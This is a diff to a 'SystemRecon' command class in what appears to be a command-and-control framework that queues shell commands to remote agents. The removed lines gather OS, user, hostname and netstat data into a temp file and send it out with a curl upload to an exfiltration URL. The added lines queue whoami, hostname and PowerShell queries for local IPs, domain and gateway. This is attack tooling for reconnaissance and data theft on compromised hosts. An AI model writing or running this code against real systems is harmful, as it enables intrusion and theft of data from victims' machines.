@@ -51,59 +51,21 @@ class SystemRecon(BaseCommand):
 
     def __init__(self, command, args_list, agent_id):
         super().__init__(command, args_list, agent_id)
-        self.exfil_url = args_list[0] if len(args_list) > 0 else None
-        self.temp_filepath = (
-            args_list[1] if len(args_list) > 1 else "C:\\temp\\sys_recon.txt"
-        )
         self.agent_class = BaseAgent(agent_id)
 
     def run(self):
-        recon_data = ""
+        # list of commands to run
         cmds = [
-            ("OS Version", "shell ver"),
-            ("Current User", "shell whoami"),
-            ("Hostname", "shell hostname"),
+            "shell ver",
+            "shell whoami",
+            "shell hostname",
+            # get all local IP's
+            "shell powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress) -join ', '\" ",
+            'shell powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"',
+            'shell powershell -c "(Get-NetIPConfiguration | Where-Object IPv4DefaultGateway).IPv4DefaultGateway.NextHop"',
         ]
-        for label, cmd in cmds:
-            cmd_id = self.agent_class.enqueue_command(cmd)
-            time.sleep(1)
-            response = self.agent_class.get_one_command_and_response(cmd_id).get(
-                "response", ""
-            )
-            recon_data += f"{label}:\n{response}\n\n"
-
-        netstat_cmd = "start_process netstat -ano"
-        netstat_id = self.agent_class.enqueue_command(netstat_cmd)
-        time.sleep(2)
-        netstat_resp = self.agent_class.get_one_command_and_response(netstat_id).get(
-            "response", ""
-        )
-        recon_data += f"Netstat:\n{netstat_resp}\n\n"
-
-        write_cmd = f"write_file {self.temp_filepath} {recon_data}"
-        write_id = self.agent_class.enqueue_command(write_cmd)
-        time.sleep(1)
-        write_resp = self.agent_class.get_one_command_and_response(write_id).get(
-            "response", ""
-        )
-        if "error" in write_resp.lower():
-            print("Failed to write recon data:", write_resp)
-        else:
-            print("Recon data saved locally.")
-            self.agent_class.store_response(write_id, write_resp)
-
-        if self.exfil_url:
-            exfil_cmd = f"shell curl -F 'file=@{self.temp_filepath}' {self.exfil_url}"
-            exfil_id = self.agent_class.enqueue_command(exfil_cmd)
-            time.sleep(2)
-            exfil_resp = self.agent_class.get_one_command_and_response(exfil_id).get(
-                "response", ""
-            )
-            if "error" in exfil_resp.lower():
-                print("Exfiltration may have failed:", exfil_resp)
-            else:
-                print("Exfiltration successful.")
-                self.agent_class.store_response(exfil_id, exfil_resp)
+        for cmd in cmds:
+            self.agent_class.enqueue_command(cmd)
 
 
 ######################################
